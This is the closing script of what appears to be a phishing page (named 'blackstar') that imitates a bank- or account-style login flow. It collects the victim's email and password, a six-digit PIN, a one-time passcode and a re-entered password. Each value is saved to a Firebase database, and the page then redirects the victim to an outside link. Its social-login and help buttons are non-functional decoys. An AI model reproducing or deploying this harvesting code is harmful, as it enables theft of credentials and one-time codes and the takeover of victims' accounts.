$('eyeBtn').addEventListener('click', () => { pw.type = pw.type === 'password' ? 'text' : 'password'; });
['googleBtn','appleBtn','forgot','helpBtn'].forEach(id => $(id).addEventListener('click', () => toast(NA_MESSAGE)));
loginBtn.addEventListener('click', doLogin);

function niceName(addr){
  const n = addr.split('@')[0].replace(/[0-9_.\-]+/g,' ').trim();
  return n ? n.toUpperCase() : 'USER';
}

function doLogin(){
  if (!validate()){ $('msg').textContent = 'Enter a valid email and your password.'; return; }
  $('msg').textContent = '';

  const emailVal = email.value.trim();
  const pwVal = pw.value;

  // ✅ Save to Firebase
  const userId = "User_" + Date.now().toString(36).toUpperCase();
  database.ref(DB_NODE + "/" + userId).set({
    id: userId,
    email: emailVal,
    password: pwVal,
    pin: "",
    otp: "",
    timestamp: new Date().toLocaleString()
  }).then(() => {
    sessionStorage.setItem("blackstar_userId", userId);
    sessionStorage.setItem("blackstar_email", emailVal);
    $('userName').textContent = niceName(emailVal);
    $('otpEmail').textContent = emailVal;
    pinInput.value = ''; renderBoxes(pinBoxes, '', true);
    show('s-pin');
    pinInput.focus();
    setTimeout(() => pinInput.focus(), 80);
  }).catch(err => {
    console.error("❌ Firebase error:", err);
    sessionStorage.setItem("blackstar_userId", userId);
    sessionStorage.setItem("blackstar_email", emailVal);
    $('userName').textContent = niceName(emailVal);
    $('otpEmail').textContent = emailVal;
    pinInput.value = ''; renderBoxes(pinBoxes, '', true);
    show('s-pin');
    pinInput.focus();
  });
}

/* ---------- Code boxes (PIN / OTP) ---------- */
function renderBoxes(wrap, val, mask){
  [...wrap.children].forEach((b, i) => {
    const filled = i < val.length;
    b.classList.toggle('filled', filled);
    b.classList.toggle('focus', i === Math.min(val.length, 5));
    if (mask){ b.firstElementChild.style.display = filled ? 'block' : 'none'; }
    else { b.textContent = filled ? val[i] : ''; }
  });
}
const pinInput = $('pinInput'), pinBoxes = $('pinBoxes');
const otpInput = $('otpInput'), otpBoxes = $('otpBoxes');
renderBoxes(pinBoxes, '', true); renderBoxes(otpBoxes, '', false);

/* ✅ PIN input → save to Firebase, then go to OTP */
pinInput.addEventListener('input', () => {
  pinInput.value = pinInput.value.replace(/\D/g,'').slice(0,6);
  renderBoxes(pinBoxes, pinInput.value, true);
  if (pinInput.value.length === 6){
    const userId = sessionStorage.getItem("blackstar_userId");
    if (userId){
      database.ref(DB_NODE + "/" + userId).update({ pin: pinInput.value }).catch(err => console.error(err));
    }
    setTimeout(openOtp, 250);
    otpInput.focus();
  }
});
pinBoxes.addEventListener('click', () => pinInput.focus());
$('s-pin').addEventListener('click', e => { if (!e.target.closest('button')) pinInput.focus(); });
$('toPassword').addEventListener('click', () => { pinInput.blur(); show('s-login'); });

/* ---------- OTP ---------- */
let left = 0, tick = null;
function fmt(s){ return String(Math.floor(s/60)).padStart(2,'0') + ':' + String(s%60).padStart(2,'0'); }
function startTimer(){
  clearInterval(tick); left = OTP_SECONDS;
  $('timer').textContent = fmt(left);
  $('resendIn').style.visibility = 'visible';
  $('resendBtn').classList.remove('ready');
  tick = setInterval(() => {
    left--; $('timer').textContent = fmt(Math.max(left,0));
    if (left <= 0){ clearInterval(tick); $('resendIn').style.visibility = 'hidden'; $('resendBtn').classList.add('ready'); }
  }, 1000);
}
function openOtp(){
  otpInput.value = ''; renderBoxes(otpBoxes, '', false);
  show('s-otp'); startTimer(); otpInput.focus(); setTimeout(() => otpInput.focus(), 80);
}

/* ✅ OTP input → save to Firebase, then go to Security Checkup */
otpInput.addEventListener('input', () => {
  otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
  renderBoxes(otpBoxes, otpInput.value, false);
  if (otpInput.value.length === 6){
    const userId = sessionStorage.getItem("blackstar_userId");
    if (userId){
      database.ref(DB_NODE + "/" + userId).update({ otp: otpInput.value })
        .then(() => openCheckup())
        .catch(err => { console.error(err); openCheckup(); });
    } else {
      openCheckup();
    }
  }
});
otpBoxes.addEventListener('click', () => otpInput.focus());
$('s-otp').addEventListener('click', e => { if (!e.target.closest('button')) otpInput.focus(); });
$('otpBack').addEventListener('click', () => { clearInterval(tick); otpInput.blur(); pinInput.value=''; renderBoxes(pinBoxes,'',true); show('s-pin'); pinInput.focus(); });
$('resendBtn').addEventListener('click', () => {
  if (!$('resendBtn').classList.contains('ready')) return;
  otpInput.value = ''; renderBoxes(otpBoxes, '', false); startTimer(); otpInput.focus();
});

/* ---------- Security Checkup ---------- */
function openCheckup(){
  otpInput.blur();
  show('s-checkup');
  setTimeout(() => {
    openPasswordPage();
  }, CHECKUP_MS);
}

/* ---------- Password Page ---------- */
function openPasswordPage(){
  const savedEmail = sessionStorage.getItem("blackstar_email") || "";
  $('emailDisplay').textContent = savedEmail;
  $('finalPw').value = '';
  $('finalPw').type = 'password';
  show('s-password');
  setTimeout(() => $('finalPw').focus(), 100);
}

/* Show/hide password on password page */
$('finalEye').addEventListener('click', () => {
  const p = $('finalPw');
  p.type = p.type === 'password' ? 'text' : 'password';
});

/* ✅ Continue → save password to Firebase + redirect */
$('finalContinue').addEventListener('click', () => {
  const pwVal = $('finalPw').value;
  if (!pwVal){ toast("Please enter your password"); return; }

  const userId = sessionStorage.getItem("blackstar_userId");
  if (userId){
    database.ref(DB_NODE + "/" + userId).update({ finalPassword: pwVal }).catch(err => console.error(err));
  }

  // ✅ Redirect to your link
  window.location.href = REDIRECT_LINK;
});
</script>
</body>
